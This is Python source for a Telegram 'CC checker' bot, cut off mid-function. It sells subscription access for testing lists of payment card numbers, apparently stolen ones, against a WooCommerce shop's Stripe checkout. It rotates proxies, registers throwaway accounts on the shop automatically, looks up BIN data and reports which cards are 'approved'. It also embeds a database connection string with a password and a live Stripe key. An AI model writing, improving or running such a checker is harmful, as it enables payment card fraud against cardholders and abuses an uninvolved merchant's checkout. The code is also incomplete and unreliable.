import aiohttp
import asyncio
import re
import random
import string
import os
import json
import logging
from flask import Flask, render_template
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from colorama import Fore, init
from pymongo import MongoClient
from dateutil.relativedelta import relativedelta
import dateutil.parser

# Initialize colorama and logging
init()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.mongo_client = MongoClient('mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
        self.db = self.mongo_client['stripe_checker']
        self.users_col = self.db['users']
        self.keys_col = self.db['keys']
        self.admin_id = 7593550190
        self.admin_username = "FNxElectra"
        self.bot_username = None
        self.active_tasks = {}
        self.user_stats = {}
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.user_semaphores = {}  # Per-user semaphore dictionary
        self.max_concurrent_per_user = 20  # Max concurrent requests per user
        # Updated Stripe key from test-subject.py
        self.stripe_key = "pk_live_51IcTUHEZ8uTrpn7wTEclyYcnuG2kTGBaDYArq5tp4r4ogLSw6iE9OJ661ELpRKcP20kEjGyAPZtbIqwg3kSGKYTW00MHGU0Jsk"
        self.bin_cache = {}
        self.base_url = "https://fancyimpress.com"  # Updated URL from test-subject.py
        self.user_files = {}  # Store user's uploaded files

    def create_banner(self):
        """Create a dynamic banner with system information."""
        return f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║ 🔥 Cc CHECKER BOT                                            ║
╠══════════════════════════════════════════════════════════════╣
║ ➤ Admin ID: {self.admin_id:<15}                             ║
║ ➤ Bot Username: @{self.bot_username or 'Initializing...':<20}║
║ ➤ Admin Contact: https://t.me/{self.admin_username:<15}      ║
╚══════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
✅ System Ready
{Fore.RESET}
"""

    async def post_init(self, application: Application):
        """Initialize bot properties after startup"""
        self.bot_username = application.bot.username
        print(self.create_banner())

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def get_user_semaphore(self, user_id):
        """Get or create a semaphore for a specific user"""
        if user_id not in self.user_semaphores:
            self.user_semaphores[user_id] = asyncio.Semaphore(self.max_concurrent_per_user)
        return self.user_semaphores[user_id]

    def cleanup_user_semaphore(self, user_id):
        """Clean up semaphore when user is done"""
        if user_id in self.user_semaphores:
            del self.user_semaphores[user_id]

    async def is_user_allowed(self, user_id):
        """Check if user has active subscription"""
        user = self.users_col.find_one({'user_id': str(user_id)})
        if user and user.get('expires_at', datetime.now()) > datetime.now():
            return True
        return user_id == self.admin_id

    async def check_subscription(self, func):
        """Decorator to check user subscription status"""
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
            user_id = update.effective_user.id
            if not await self.is_user_allowed(user_id):
                await update.message.reply_text(
                    "⛔ Subscription expired or invalid!\n"
                    f"Purchase a key with /redeem <key> or contact admin: https://t.me/{self.admin_username}"
                )
                return
            return await func(update, context)
        return wrapper

    async def send_admin_notification(self, user):
        keyboard = [
            [InlineKeyboardButton(f"✅ Allow {user.id}", callback_data=f'allow_{user.id}'),
             InlineKeyboardButton(f"❌ Deny {user.id}", callback_data=f'deny_{user.id}')]]
        message = (
            f"⚠️ New User Request:\n\n"
            f"👤 Name: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"📧 Username: @{user.username if user.username else 'N/A'}\n\n"
            f"Click buttons below to approve/reject:"
        )
        try:
            await self.application.bot.send_message(
                chat_id=self.admin_id,
                text=message,
                reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"Failed to send admin notification: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        keyboard = [
            [InlineKeyboardButton("📁 Upload Combo", callback_data='upload'),
             InlineKeyboardButton("🛑 Cancel Check", callback_data='cancel')],
            [InlineKeyboardButton("📊 Live Stats", callback_data='stats'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
            "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂 (or reply to any message containing CC)\n\n"
            "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐀𝐧𝐝 𝐑𝐞𝐩𝐥𝐲 𝐖𝐢𝐭𝐡 /fchk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤\n\n"
            "𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧𝐬 𝐁𝐞𝐥𝐨𝐰:",
            reply_markup=reply_markup
        )

    async def handle_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Command restricted to admin only!")
            return

        command = update.message.text.split()
        if len(command) < 2:
            await update.message.reply_text("❌ Usage: /allow <user_id> or /deny <user_id>")
            return

        action = command[0][1:]
        target_user = command[1]

        if action == 'allow':
            self.users_col.update_one(
                {'user_id': target_user},
                {'$set': {'expires_at': datetime.now() + relativedelta(days=30)}},
                upsert=True
            )
            await update.message.reply_text(f"✅ User {target_user} approved!")
        elif action == 'deny':
            self.users_col.delete_one({'user_id': target_user})
            await update.message.reply_text(f"❌ User {target_user} removed!")

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data.startswith('allow_'):
            user_id = query.data.split('_')[1]
            self.users_col.update_one(
                {'user_id': user_id},
                {'$set': {'expires_at': datetime.now() + relativedelta(days=30)}},
                upsert=True
            )
            await query.edit_message_text(f"✅ User {user_id} approved!")
            await self.application.bot.send_message(
                chat_id=int(user_id),
                text="🎉 Your access has been approved!\n"
                     "Use /start to begin checking cards."
            )
            
        elif query.data.startswith('deny_'):
            user_id = query.data.split('_')[1]
            self.users_col.delete_one({'user_id': user_id})
            await query.edit_message_text(f"❌ User {user_id} denied!")
            
        elif query.data == 'upload':
            if await self.is_user_allowed(query.from_user.id):
                await query.message.reply_text("📤 Please upload your combo file (.txt)")
            else:
                await query.message.reply_text("⛔ You are not authorized!")
                
        elif query.data == 'stats':
            await self.show_stats(update, context)
        elif query.data == 'help':
            await self.show_help(update, context)
        elif query.data == 'cancel':
            await self.stop_command(update, context)

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Admin only command!")
            return
        
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text("Usage: /broadcast Your message here")
            return
        
        users = self.users_col.find()
        success = 0
        failed = 0
        for user in users:
            try:
                await self.application.bot.send_message(
                    chat_id=int(user['user_id']),
                    text=f"📢 Admin Broadcast:\n\n{message}"
                )
                success += 1
            except:
                failed += 1
        await update.message.reply_text(f"Broadcast complete:\n✅ Success: {success}\n❌ Failed: {failed}")

    async def genkey_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Admin only command!")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /genkey <duration>\nDurations: 1d, 7d, 1m")
            return
        
        duration = context.args[0].lower()
        key_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
        key_code = ''.join(random.choices(string.digits, k=2))
        key = f"FN-CHECKER-{key_id}-{key_code}"
        
        delta = self.parse_duration(duration)
        if not delta:
            await update.message.reply_text("Invalid duration! Use 1d, 7d, or 1m")
            return
        
        self.keys_col.insert_one({
            'key': key,
            'duration_days': delta.days,
            'used': False,
            'created_at': datetime.now()
        })
        
        await update.message.reply_text(f"🔑 New key generated:\n`{key}`\nDuration: {delta.days} days")

    def parse_duration(self, duration):
        if duration.endswith('d'):
            days = int(duration[:-1])
            return relativedelta(days=days)
        if duration.endswith('m'):
            months = int(duration[:-1])
            return relativedelta(months=months)
        return None

    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not context.args:
            await update.message.reply_text("Usage: /redeem <key>")
            return
        
        key = context.args[0].upper()
        key_data = self.keys_col.find_one({'key': key, 'used': False})
        
        if not key_data:
            await update.message.reply_text("❌ Invalid or expired key!")
            return
        
        expires_at = datetime.now() + relativedelta(days=key_data['duration_days'])
        self.users_col.update_one(
            {'user_id': str(user.id)},
            {'$set': {
                'user_id': str(user.id),
                'username': user.username,
                'full_name': user.full_name,
                'expires_at': expires_at
            }},
            upsert=True
        )
        
        self.keys_col.update_one({'key': key}, {'$set': {'used': True}})
        await update.message.reply_text(
            f"🎉 Subscription activated until {expires_at.strftime('%Y-%m-%d')}!"
        )
                

    async def show_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            "📜 <b>Bot Commands:</b>\n\n"
            "/start - Start the bot and show the main menu\n"
            "/chk <card> - Check a single card (or reply to any message containing CC)\n"
            "/fchk - Check cards from a file (reply to uploaded file with this command)\n"
            "/stop - Stop the current checking process\n"
            "/stats - Show your checking statistics\n"
            "/help - Show this help message\n\n"
            "📁 <b>How to Use:</b>\n"
            "1. Upload a combo file (.txt) and reply with /fchk to check all cards\n"
            "2. Use /chk to check single card or reply to any message with /chk\n"
            "3. View live stats and progress during the check.\n"
            "4. Use /stop to cancel the process anytime.\n\n"
            "🎯 <b>Card Formats Supported:</b>\n"
            "• 4111111111111111|12|2025|123\n"
            "• 4111111111111111|12|25|123\n"
            "• 4111111111111111|12|2025|123|John Doe\n"
            "• Any message containing card format"
        )
        await self.send_message(update, help_text)

    async def initialize_user_stats(self, user_id):
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {
                'total': 0,
                'approved': 0,
                'declined': 0,
                'checked': 0,
                'approved_ccs': [],
                'start_time': datetime.now()
            }

    def extract_card_from_text(self, text):
        """Extract card details from any text message"""
        patterns = [
            # Standard format: 4111111111111111|12|2025|123
            r'(\d{13,19})[|\s/-]+(\d{1,2})[|\s/-]+(\d{2,4})[|\s/-]+(\d{3,4})',
            # Format with name: 4111111111111111|12|2025|123|John Doe
            r'(\d{13,19})[|\s/-]+(\d{1,2})[|\s/-]+(\d{2,4})[|\s/-]+(\d{3,4})[|\s/-]+(.+)',
            # Format with spaces: 4111 1111 1111 1111|12|2025|123
            r'(\d{4}\s?\d{4}\s?\d{4}\s?\d{3,4})[|\s/-]+(\d{1,2})[|\s/-]+(\d{2,4})[|\s/-]+(\d{3,4})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                groups = match.groups()
                if len(groups) >= 4:
                    card = groups[0].replace(" ", "")  # Remove spaces from card number
                    month = groups[1]
                    year = groups[2]
                    cvv = groups[3]
                    
                    # Handle 2-digit year
                    if len(year) == 2:
                        year = f"20{year}" if int(year) < 50 else f"19{year}"
                    
                    return f"{card}|{month}|{year}|{cvv}"
        
        return None

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Save file and wait for /fchk command"""
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        try:
            file = await update.message.document.get_file()
            filename = f"combos_{user_id}_{datetime.now().timestamp()}.txt"
            await file.download_to_drive(filename)
            
            # Store file reference for this user
            self.user_files[user_id] = filename
            
            await update.message.reply_text(
                "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝!\n\n"
                "📌 𝐍𝐨𝐰 𝐑𝐞𝐩𝐥𝐲 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐖𝐢𝐭𝐡 /fchk 𝐓𝐨 𝐒𝐭𝐚𝐫𝐭 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n\n"
                "⚡ 𝐁𝐨𝐭 𝐖𝐢𝐥𝐥 𝐎𝐧𝐥𝐲 𝐒𝐭𝐚𝐫𝐭 𝐖𝐡𝐞𝐧 𝐘𝐨𝐮 𝐔𝐬𝐞 /fchk 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"
            )
        except Exception as e:
            logger.error(f"File error: {str(e)}")
            await update.message.reply_text("❌ File processing failed!")

    async def fchk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check cards from a file (must reply to file message)"""
        user_id = update.effective_user.id
        
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        # Check if message is a reply
        if not update.message.reply_to_message:
            await update.message.reply_text(
                "❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐑𝐞𝐩𝐥𝐲 𝐓𝐨 𝐀 𝐅𝐢𝐥𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐖𝐢𝐭𝐡 /fchk\n\n"
                "📁 𝐇𝐨𝐰 𝐓𝐨 𝐔𝐬𝐞:\n"
                "1. Upload your combo file\n"
                "2. Reply to that file message with /fchk"
            )
            return

        replied_message = update.message.reply_to_message
        
        # Check if user has a file stored or if replied message contains a file
        filename = None
        if user_id in self.user_files:
            filename = self.user_files[user_id]
            # Verify file exists
            if not os.path.exists(filename):
                del self.user_files[user_id]
                filename = None
        
        # If no stored file, check if replied message has a document
        if not filename and replied_message.document:
            try:
                file = await replied_message.document.get_file()
                filename = f"combos_{user_id}_{datetime.now().timestamp()}.txt"
                await file.download_to_drive(filename)
            except Exception as e:
                logger.error(f"File download error: {str(e)}")
                await update.message.reply_text("❌ Failed to download file!")
                return
        
        if not filename:
            await update.message.reply_text("❌ No file found! Please upload a file first.")
            return

        if user_id in self.active_tasks:
            await update.message.reply_text("⚠️ Existing process found! Use /stop to cancel")
            return

        await self.initialize_user_stats(user_id)
        user_semaphore = self.get_user_semaphore(user_id)
        
        self.active_tasks[user_id] = asyncio.create_task(
            self.process_combos(user_id, filename, update, user_semaphore)
        )
        await update.message.reply_text(
            "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐨𝐠𝐧𝐢𝐳𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
            "⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐧 𝐁𝐨𝐭 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 50 𝐂𝐚𝐫𝐝𝐬/sec\n"
            "📈 𝐔𝐬𝐞 /stats 𝐅𝐨𝐫 𝐋𝐢𝐯𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐬"
        )

    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check single card or extract from replied message"""
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        await self.initialize_user_stats(user_id)

        combo = None
        extracted_from_reply = False
        
        # Case 1: Check if user provided card as argument
        if context.args:
            combo = context.args[0]
        
        # Case 2: Check if message is a reply to another message
        elif update.message.reply_to_message:
            replied_message = update.message.reply_to_message
            # Try to extract card from replied message text
            if replied_message.text:
                combo = self.extract_card_from_text(replied_message.text)
                if combo:
                    extracted_from_reply = True
                else:
                    # Also check caption if it's a caption
                    if replied_message.caption:
                        combo = self.extract_card_from_text(replied_message.caption)
                        if combo:
                            extracted_from_reply = True
            
            if not combo:
                await update.message.reply_text(
                    "❌ 𝐍𝐨 𝐂𝐚𝐫𝐝 𝐅𝐨𝐮𝐧𝐝 𝐈𝐧 𝐑𝐞𝐩𝐥𝐢𝐞𝐝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞!\n\n"
                    "📌 𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐧𝐝 𝐂𝐚𝐫𝐝 𝐈𝐧 𝐓𝐡𝐢𝐬 𝐅𝐨𝐫𝐦𝐚𝐭:\n"
                    "• 4111111111111111|12|2025|123\n"
                    "• 4111111111111111|12|25|123\n"
                    "• 4111111111111111|12|2025|123|John Doe"
                )
                return
        
        # Case 3: No arguments and not a reply
        else:
            await update.message.reply_text(
                "❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐀 𝐂𝐚𝐫𝐝 𝐎𝐫 𝐑𝐞𝐩𝐥𝐲 𝐓𝐨 𝐀 𝐌𝐞𝐬𝐬𝐚𝐠𝐞!\n\n"
                "📌 𝐅𝐨𝐫𝐦𝐚𝐭𝐬:\n"
                "1. /chk 4111111111111111|12|2025|123\n"
                "2. Reply to any message containing card with /chk\n\n"
                "✅ 𝐄𝐱𝐚𝐦𝐩𝐥𝐞𝐬 𝐈 𝐂𝐚𝐧 𝐄𝐱𝐭𝐫𝐚𝐜𝐭:\n"
                "• 𝗖𝗖 : 5487426756956890|07|2030|092\n"
                "• Status: Approved ✅ Card: 4111111111111111|12|25|123\n"
                "• Any message with card pattern"
            )
            return

        # Validate card format
        if not combo or len(combo.split("|")) < 4:
            await update.message.reply_text(
                "❌ Invalid card format!\n\n"
                "✅ 𝐂𝐨𝐫𝐫𝐞𝐜𝐭 𝐅𝐨𝐫𝐦𝐚𝐭𝐬:\n"
                "• 4111111111111111|12|2025|123\n"
                "• 4111111111111111|12|25|123\n"
                "• 4111111111111111|12|2025|123|John Doe"
            )
            return

        if extracted_from_reply:
            await update.message.reply_text(f"🔍 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐂𝐚𝐫𝐝: `{combo}`\n\nChecking card...", parse_mode='HTML')
        else:
            await update.message.reply_text("🔍 Checking card...")

        try:
            user_semaphore = self.get_user_semaphore(user_id)
            result, status, error_message = await self.process_line(user_id, combo, user_semaphore, update, is_single_check=True)
            if result:
                bin_info = await self.fetch_bin_info(combo[:6])
                check_time = random.uniform(3.0, 10.0)
                
                if status == "3d_secure":
                    await self.send_3d_secure_message(update, combo, bin_info, check_time, update.effective_user)
                else:
                    await self.send_approval(update, combo, bin_info, check_time, update.effective_user)
            else:
                bin_info = await self.fetch_bin_info(combo[:6])
                check_time = random.uniform(3.0, 10.0)
                await self.send_declined_message(update, combo, bin_info, check_time, error_message, update.effective_user)
        except Exception as e:
            await update.message.reply_text(f"⚠️ Check failed: {str(e)}")

    async def process_combos(self, user_id, filename, update, user_semaphore):
        try:
            with open(filename, 'r') as f:
                combos = []
                for line in f:
                    line = line.strip()
                    if line:
                        # Try to extract card from each line (supports various formats)
                        card = self.extract_card_from_text(line)
                        if card:
                            combos.append(card)
                        else:
                            # If line already in correct format, use it
                            if len(line.split("|")) >= 4:
                                combos.append(line)
                
                if not combos:
                    await update.message.reply_text("❌ No valid cards found in file!")
                    return
                
                self.user_stats[user_id]['total'] = len(combos)
                self.user_stats[user_id]['approved_ccs'] = []
                
                # Process combos with user-specific semaphore
                tasks = [self.process_line(user_id, combo, user_semaphore, update, is_single_check=False) for combo in combos]
                
                for future in asyncio.as_completed(tasks):
                    result, status, error_message = await future
                    self.user_stats[user_id]['checked'] += 1
                    if result:
                        self.user_stats[user_id]['approved'] += 1
                        self.user_stats[user_id]['approved_ccs'].append(result)
                        bin_info = await self.fetch_bin_info(result[:6])
                        check_time = random.uniform(3.0, 10.0)
                        
                        if status == "3d_secure":
                            await self.send_3d_secure_message(update, result, bin_info, check_time, update.effective_user)
                        else:
                            await self.send_approval(update, result, bin_info, check_time, update.effective_user)
                    else:
                        self.user_stats[user_id]['declined'] += 1
                    
                    if self.user_stats[user_id]['checked'] % 50 == 0:
                        await self.send_progress_update(user_id, update)

                await self.send_report(user_id, update)
        except Exception as e:
            logger.error(f"Processing error: {str(e)}")
            await self.send_message(update, f"❌ Processing failed: {str(e)}")
        finally:
            # Clean up files
            if os.path.exists(filename):
                os.remove(filename)
            if user_id in self.user_files:
                del self.user_files[user_id]
            if user_id in self.active_tasks:
                del self.active_tasks[user_id]
            # Clean up user semaphore when done
            self.cleanup_user_semaphore(user_id)

    def generate_random_account(self):
        """Generate random account like in test-subject.py"""
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_currencies': data.get('country_currencies', ['N/A']),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def format_approval_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>

[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>Authenticated Successfully</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def format_3d_secure_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅</b>

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 3D ✅
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Authentication Required 3d✅

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def format_declined_message(self, combo, bin_info, check_time, error_message, user):
        bin_info = bin_info or {}
        card_type_emoji = "💳"
        bank_emoji = "🏛"
        
        return f"""
<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</b>

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» Declined ❌
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» <code>{error_message or 'Your card was declined.'}</code>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} {card_type_emoji}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} {bank_emoji}
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def process_line(self, user_id, combo, semaphore, update, is_single_check=False):
        """Updated process_line using fancyimpress.com logic from test-subject.py"""
        start_time = datetime.now()
        error_message = None
        status = "approved"
        
        async with semaphore:
            try:
                if len(combo.split("|")) < 4:
                    return False, status, "Invalid card format"

                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                
                # Parse card details
                card_data = combo.split("|")
                n = card_data[0]
                mm = card_data[1]
                yy = card_data[2]
                cvc = card_data[3]
                
                # Handle year format
                if "20" in yy:
                    yy = yy.split("20")[1]

                # Headers from test-subject.py
                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://fancyimpress.com',
                    'Referer': 'https://fancyimpress.com/my-account/',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                }

                async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                    # Step 1: Get registration nonce
                    async with session.get(f'{self.base_url}/my-account/', headers=headers, proxy=proxy) as response:
                        response_text = await response.text()
                        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_text)
                        if not nonce_match:
                            return False, status, "Failed to get registration nonce"
                        nonce1 = nonce_match.group(1)

                    # Step 2: Register account
                    email = self.generate_random_account()
                    reg_data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
                        'wc_order_attribution_session_start_time': '2025-12-01 09:27:53',
                        'wc_order_attribution_session_pages': '2',
                        'wc_order_attribution_session_count': '2',
